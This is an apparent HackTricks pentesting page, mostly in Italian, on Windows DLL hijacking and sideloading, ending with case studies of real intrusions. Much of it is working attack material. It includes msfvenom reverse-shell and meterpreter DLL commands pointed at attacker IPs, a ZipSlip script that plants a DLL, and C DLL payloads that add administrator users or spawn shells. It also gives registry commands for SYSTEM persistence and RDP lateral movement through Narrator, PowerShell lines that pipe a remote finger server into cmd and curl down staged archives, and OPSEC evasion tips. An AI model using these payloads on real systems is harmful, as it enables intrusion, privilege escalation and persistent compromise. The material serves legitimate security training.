# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione trusted affinché carichi una DLL malevola. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per code execution, ottenere persistence e, meno comunemente, per privilege escalation. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane lo stesso a prescindere dall'obiettivo.

### Tecniche comuni

Vengono impiegati diversi metodi per il DLL hijacking, ciascuno con la propria efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL legittima con una malevola, eventualmente usando DLL Proxying per preservare la funzionalità originale della DLL.
2. **DLL Search Order Hijacking**: Posizionare la DLL malevola in un percorso di ricerca antecedente a quello della DLL legittima, sfruttando lo schema di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione carichi pensando sia una DLL richiesta ma assente.
4. **DLL Redirection**: Modificare i parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una malevola nella directory WinSxS, metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, assomigliando alle tecniche di Binary Proxy Execution.

> [!TIP]
> Per una chain step-by-step che sovrappone HTML staging, AES-CTR configs e implant .NET sopra il DLL sideloading, consulta il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trovare Dll mancanti

Il modo più comune per trovare Dll mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) da sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrando solo la **File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **dll mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **dll mancante dentro un eseguibile specifico** dovresti impostare **un altro filtro come `Process Name` `contains` `<exec name>`, eseguirlo e fermare la cattura degli eventi`**.

## Sfruttare Dll mancanti

Per poter eseguire privilege escalation, la nostra migliore possibilità è riuscire a **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **posti in cui verrà cercata**. Di conseguenza, potremo **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella contenente la **dll originale** (caso anomalo), oppure potremo **scrivere** in qualche cartella dove la dll verrà cercata e la dll originale **non esiste** in nessuna cartella.

### Dll Search Order

**Nella** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come le DLL vengono caricate in dettaglio.**

Le applicazioni Windows cercano le DLL seguendo un insieme di path di ricerca predefiniti, rispettando una sequenza particolare. Il problema del DLL hijacking si presenta quando una DLL malevola viene posizionata strategicamente in una di queste directory, garantendo che venga caricata prima della DLL autentica. Una soluzione per prevenire ciò è assicurarsi che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere l'**ordine di ricerca delle DLL su sistemi a 32-bit** qui sotto:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca **di default** con **SafeDllSearchMode** abilitato. Quando è disabilitato la current directory scala al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll potrebbe essere caricata indicando il percorso assoluto invece che solo il nome**. In tal caso quella dll verrà **cercata solo in quel percorso** (se la dll ha dipendenze, queste verranno cercate come se la dll fosse stata caricata solo per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Consegnare l'archivio nella inbox/share monitorata; quando lo scheduled task rilancerà il processo questo caricherà la DLL malevola ed eseguirà il tuo codice con l'account di servizio.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata per nome (nessun percorso assoluto e senza usare i flag di safe loading) può essere forzato a caricare una DLL malevola da quella directory.

Idea chiave
- Costruisci i parametri del processo con RtlCreateProcessParametersEx e fornisci un DllPath personalizzato che punti alla cartella sotto il tuo controllo (es. la directory dove risiede il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL per nome, il loader consulterà questo DllPath fornito durante la risoluzione, permettendo un sideloading affidabile anche quando la DLL malevola non è colocata insieme all'EXE target.

Note/limitazioni
- Questo interessa il processo figlio in creazione; è diverso da SetDllDirectory, che influenza solo il processo corrente.
- Il target deve importare o usare LoadLibrary su una DLL per nome (nessun percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e percorsi assoluti hardcoded non possono essere hijackati. Forwarded exports e SxS possono cambiare la precedenza.

Esempio C minimale (ntdll, wide strings, simplified error handling):

<details>
<summary>Esempio C completo: forzare il sideloading di DLL tramite RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Posiziona una xmllite.dll malevola (che esporta le funzioni richieste o fa da proxy a quella reale) nella tua directory DllPath.
- Avvia un binario firmato noto per cercare xmllite.dll per nome usando la tecnica sopra. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare multi-stage sideloading chains: un launcher iniziale drops una helper DLL, che poi spawns un Microsoft-signed, hijackable binary con un DllPath personalizzato per forzare il caricamento della DLL dell’attaccante da una staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requisiti**:

- Identificare un processo che opera o opererà con **different privileges** (movimento orizzontale o laterale), che è **lacking a DLL**.
- Assicurarsi che sia disponibile **write access** su qualsiasi **directory** in cui la **DLL** verrà **searched for**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del system path.

Sì, i requisiti sono complicati da trovare dato che **di default è piuttosto raro trovare un eseguibile privilegiato che manchi di una dll** ed è ancora **più strano avere write permissions su una cartella del system path** (non è possibile di default). Ma, in ambienti mal configurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, potresti dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se l'**main goal of the project is bypass UAC**, potresti trovare lì una **PoC** di Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il path della cartella dove hai write permissions).

Nota che puoi **check your permissions in a folder** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifica i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare le importazioni di un eseguibile e le esportazioni di una DLL con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking per elevare i privilegi** avendo permessi di scrittura in una **System Path folder** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatici

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai permessi di scrittura su qualsiasi folder all'interno della system PATH.\
Altri strumenti automatici interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Se trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Nota che Dll Hijacking risulta utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio su dll hijacking focalizzato su dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione di Dll**

### **Dll Proxifying**

Fondamentalmente un **Dll proxy** è una Dll capace di **eseguire il tuo codice dannoso quando viene caricata**, ma anche di **esporre** e **funzionare** come **atteso** inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono il **binary non sarà in grado di caricarle** e l'**exploit fallirà**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con punto di ingresso del thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibilità/ATs)

Windows Narrator.exe continua a provare a caricare una DLL di localizzazione prevedibile e specifica per lingua all'avvio che può essere hijacked per arbitrary code execution e persistence.

Key facts
- Percorso ispezionato (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build più vecchie): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se esiste una DLL scrivibile controllata dall'attaccante nel percorso OneCore, viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. No exports are required.

Discovery with Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silenzio OPSEC
- Un hijack ingenuo parlerà/evidenzierà l'UI. Per restare silenziosi, quando si effettua l'attach enumerare i thread di Narrator, aprire il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e chiamare `SuspendThread` su di esso; continuare nel proprio thread. Vedi PoC per il codice completo.

Trigger and persistence via Accessibility configuration
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL piantata. Sul secure desktop (schermata di accesso), premere CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Consentire lo strato di sicurezza classico di RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Effettua una connessione RDP all'host; nella schermata di accesso premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop (schermata di accesso).
- L'esecuzione si interrompe quando la sessione RDP si chiude—inietta/migra prontamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (es., CursorIndicator), modificarla per puntare a un arbitrario binario/DLL, importarla, quindi impostare `configuration` su quel nome AT. Questo fa da proxy per l'esecuzione arbitraria tramite il framework Accessibility.

Note
- Scrivere in `%windir%\System32` e modificare valori HKLM richiede privilegi amministrativi.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub `hostfxr.dll` malevolo nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, posiziona `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 sotto il contesto dell'utente corrente.
3. Se un amministratore è connesso quando l'attività viene eseguita, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Esegui tecniche standard di UAC bypass per elevare da integrità media a privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli attori di minaccia spesso associano dropper basati su MSI con DLL side-loading per eseguire payload sotto un processo firmato e considerato affidabile.

Chain overview
- L'utente scarica un MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (es., LaunchApplication o un'azione VBScript), ricostruendo la fase successiva da risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllata dall'attaccante).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca DLL di Windows carica wsc.dll dalla directory di lavoro per prima, eseguendo il codice dell'attaccante sotto un parent firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabella CustomAction:
- Cerca voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), ispeziona le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/divisi nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usa lessmsi: lessmsi x package.msi C:\out
- Cerca più frammenti piccoli che vengono concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Metti questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: DLL dell'attaccante. Se non sono richieste esportazioni specifiche, DllMain può essere sufficiente; altrimenti, crea una proxy DLL e inoltra le esportazioni richieste alla libreria genuina mentre esegui il payload in DllMain.
- Costruisci un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (es., DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome DLL da parte del binario host. Se l'host usa percorsi assoluti o flag di caricamento sicuro (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), il hijack potrebbe fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e devono essere considerati durante la selezione del binario host e dell'insieme di export.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi con software legittimo mantenendo il payload principale cifrato su disco:

1. **EXE host firmato** – vendor come AMD, Realtek o NVIDIA vengono abusati (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli aggressori rinominano l'eseguibile per farlo sembrare un binario di Windows (per esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **Malicious loader DLL** – droppata accanto all'EXE con un nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è di solito un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è localizzare il blob cifrato, decifrarlo e mappare ShadowPad in memoria in modo reflectivo.
3. **Blob di payload cifrato** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decifrato, il loader cancella il file TMP per distruggere le evidenze forensi.

Tradecraft notes:

* Rinominare l'EXE firmato (pur mantenendo il `OriginalFileName` originale nell'header PE) gli permette di fingersi un binario di Windows pur conservando la firma del vendor, quindi replica l'abitudine di Ink Dragon di droppare eseguibili dall'aspetto `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l'eseguibile resta trusted, la maggior parte dei controlli di allowlisting richiedono solo che la tua DLL malevola stia accanto ad esso. Concentrati sul personalizzare il loader DLL; l'eseguibile genitore firmato di solito può essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP stia accanto al loader e sia scrivibile così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile fino al caricamento del payload; una volta in memoria il file TMP può essere eliminato in sicurezza per OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Gli operatori abbinano DLL sideloading con LOLBAS in modo che l'unico artefatto custom su disco sia la DLL malevola accanto all'EXE trusted:

- **Remote command loader (Finger):** PowerShell nascosto lancia `cmd.exe /c`, preleva comandi da un server Finger e li passa a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preleva testo su TCP/79; `| cmd` esegue la risposta del server, permettendo agli operatori di ruotare il second stage lato server.

- **Built-in download/extract:** Scarica un archivio con un'estensione benigna, estrailo e metti in staging il target di sideload più la DLL sotto una cartella casuale `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde il progresso e segue i redirect; `tar -xf` usa il tar incorporato in Windows.

- **WMI/CIM launch:** Avvia l'EXE via WMI in modo che la telemetria mostri un processo creato da CIM mentre carica la DLL collocata accanto:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binari che preferiscono DLL locali (es., `intelbq.exe`, `nearby_share.exe`); il payload (es., Remcos) gira sotto il nome trusted.

- **Hunting:** Genera alert su `forfiles` quando `/p`, `/m` e `/c` appaiono insieme; è poco comune al di fuori di script amministrativi.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione Lotus Blossom ha abusato di una catena di aggiornamento trusted per consegnare un dropper impacchettato con NSIS che ha messo in staging un DLL sideload oltre a payload eseguiti completamente in memoria.

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob cifrato `BluetoothService`, poi lancia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` mappa il blob in memoria (mmap); `LogWrite` lo decritta con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera temporanei e salta ad esso.
- Per evitare un IAT, il loader risolve le API hashando i nomi degli export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, poi applicando un'avalanche in stile Murmur (**0x85EBCA6B**) e confrontando con hash target salati.

Shellcode principale (Chrysalis)
- Decripta un modulo principale simile a un PE ripetendo add/XOR/sub con la key `gQ2JR&9;` per cinque passaggi, poi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione delle importazioni.
- Ricostruisce le stringhe dei nomi DLL a runtime tramite trasformazioni per carattere bit-rotate/XOR, poi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che attraversa la **PEB → InMemoryOrderModuleList**, parsifica ogni export table in blocchi da 4 byte con mixing in stile Murmur, e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Embedded configuration & C2
- La config risiede dentro il file `BluetoothService` droppato all'**offset 0x30808** (dimensione **0x980**) ed è decrittata RC4 con key `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
